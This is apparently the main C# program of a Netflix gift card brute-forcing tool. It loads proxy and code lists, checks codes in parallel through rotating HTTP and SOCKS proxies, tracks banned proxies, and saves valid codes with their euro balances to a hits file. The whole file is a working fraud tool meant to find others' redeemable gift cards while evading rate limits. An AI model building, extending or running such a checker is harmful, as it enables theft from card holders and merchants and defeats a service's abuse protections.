using System;
using System.Collections.Concurrent;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Colorful;
using Netflix_GC_Brute.Callers;
using Netflix_GC_Brute.Helpers;
using Netflix_GC_Brute.Task;
using Console = Colorful.Console;

namespace Netflix_GC_Brute
{
    internal class Program
    {
        [STAThread]
        public static void Main(string[] args)
        {

            #region Intro
            
            Console.ForegroundColor = Color.White;

            Logger.Inf("Select your proxies list.", true, false);

            var fileDialog = new OpenFileDialog
            {
                Filter = "Text Files|*.txt",
                Title = "Select your proxies list"
            };

            while (fileDialog.ShowDialog() != DialogResult.OK)
            {
            }

            var fileName = fileDialog.FileName;
            var proxyList = FileHelper.ReadAsList(fileDialog.FileName);

            Logger.Inf($"{proxyList.Count} proxies loaded from {Path.GetFileName(fileName)}", true);

            Logger.Inf("Select your code list.", true, false);

            fileDialog.Title = "Select your code list";

            while (fileDialog.ShowDialog() != DialogResult.OK)
            {
            }

            fileName = fileDialog.FileName;
            var codeList = FileHelper.ReadAsList(fileDialog.FileName);

            Logger.Inf($"{codeList.Count} codes loaded from {Path.GetFileName(fileName)}", true);
            
            var proxyTypes = new[] {"HTTP", "SOCKS4", "SOCKS5"};
            var proxyType = string.Empty;

            while (string.IsNullOrEmpty(proxyType))
            {
                Logger.Inf($"Proxy Type [{string.Join(", ", proxyTypes)}] : ", newLine: false);

                var input = Console.ReadLine();

                if (proxyTypes.Contains(input))
                    proxyType = input;
            }

            var maxThreads = -1;

            while (maxThreads < 0)
            {
                Logger.Inf("Max Threads : ", newLine: false);

                try
                {
                    var input = Console.ReadLine();

                    if (string.IsNullOrEmpty(input)) continue;

                    maxThreads = int.Parse(input);
                }
                catch (FormatException)
                {
                    // ignored
                }
            }

            #endregion

            var caller = new Netflix
            {
                ProxyList = proxyList.ToArray(),
                ProxyType = proxyType,
            };

            Console.Clear();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);

            int checkedCount = 0, errorCount = 0, bannedCount = 0, validCount = 0, totalBalance = 0;

            FileHelper.BeginCheck();
            CpmTask.Start();
            Globals.Working = true;
            
            Parallel.ForEach(Partitioner.Create(codeList, EnumerablePartitionerOptions.NoBuffering),
                new ParallelOptions {MaxDegreeOfParallelism = maxThreads}, code =>
                {
                    
                    caller.Check(code, (codeCb, proxy, valid, error, balance) =>
                    {
                        
                        if (new[] {"generic_failure", "unable_to_redeem", "Unable to determine balance", "Proxy timed out"}.Contains(error))
                            errorCount += 1;

                        if (error.Contains("Banned proxy"))
                            bannedCount += 1;
                        
                        if (valid && !string.IsNullOrEmpty(balance))
                        {
                            checkedCount += 1;
                            validCount += 1;
                            var rawBalance = int.Parse(new Regex("(\\d{1,3})").Match(balance).Groups[1].Value);
                            totalBalance += rawBalance;

                            FileHelper.Write("Hits.txt", $"{code} | €{rawBalance}");

                            Console.WriteLine($"{code} | {rawBalance} EUR", Color.Green);
                        }
                        else if (error.Contains("single_use_code"))
                        {
                            checkedCount += 1;
                        } 

                        Interlocked.Increment(ref Globals.LastChecks);

                        Console.Title =
                            $"NGC – Checked : {checkedCount}/{codeList.Count} – Errors : {errorCount} – Bans : {bannedCount} – Hits : {validCount} – Total: {totalBalance} EUR – CPM: {CpmTask.GetCpm()}";
                    });
                });

            Logger.Inf("Job done.");
            Thread.Sleep(-1);
        }
    }
}